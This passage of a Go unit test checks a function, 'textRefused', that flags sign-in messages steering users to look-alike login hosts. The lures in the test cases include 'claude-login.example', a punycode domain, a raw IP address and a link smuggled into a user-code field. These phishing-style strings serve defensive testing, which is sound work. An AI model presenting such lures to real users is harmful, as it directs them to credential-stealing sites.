		"message with www":         {toolSignIn{State: "needs_code", URL: uiClaudeLink, Message: "Go to WWW.evil.example now."}, true},
		"message with a bare host": {toolSignIn{State: "needs_code", URL: uiClaudeLink, Message: "Open claude-login.example/auth to continue."}, true},
		"bare host with a port":    {toolSignIn{State: "needs_code", URL: uiClaudeLink, Message: "Open claude-login.example:8443/auth now."}, true},
		"bare host with a query":   {toolSignIn{State: "needs_code", URL: uiClaudeLink, Message: "Go to claude-login.example?x=1 now."}, true},
		"punycode host":            {toolSignIn{State: "needs_code", URL: uiClaudeLink, Message: "Open claude-login.xn--p1ai/auth now."}, true},
		"address of a machine":     {toolSignIn{State: "needs_code", URL: uiClaudeLink, Message: "Open 192.168.0.7/login now."}, true},
		"a version is not a host":  {toolSignIn{State: "needs_code", URL: uiClaudeLink, Message: "Claude Code 2.1.286 asked for a new code."}, false},
		"sentences end in a dot":   {toolSignIn{State: "needs_code", URL: uiClaudeLink, Message: "Not accepted.Paste it again. Try the newest one."}, false},
		"code with a link":         {toolSignIn{State: "waiting", URL: "https://auth.openai.com/codex/device", UserCode: "ABCD https://evil.example"}, true},
		"code that is not a code":  {toolSignIn{State: "waiting", URL: "https://auth.openai.com/codex/device", UserCode: strings.Repeat("A", 40)}, true},
		"failed keeps its reason":  {toolSignIn{State: "failed", Message: "See https://help.example/codes"}, false},
		"signed in is not judged":  {toolSignIn{State: "signed_in", Message: "https://old.example"}, false},
	} {
		if got := textRefused(tc.in); got != tc.want {
			t.Errorf("%s: textRefused = %v, want %v", name, got, tc.want)
		}
	}
}
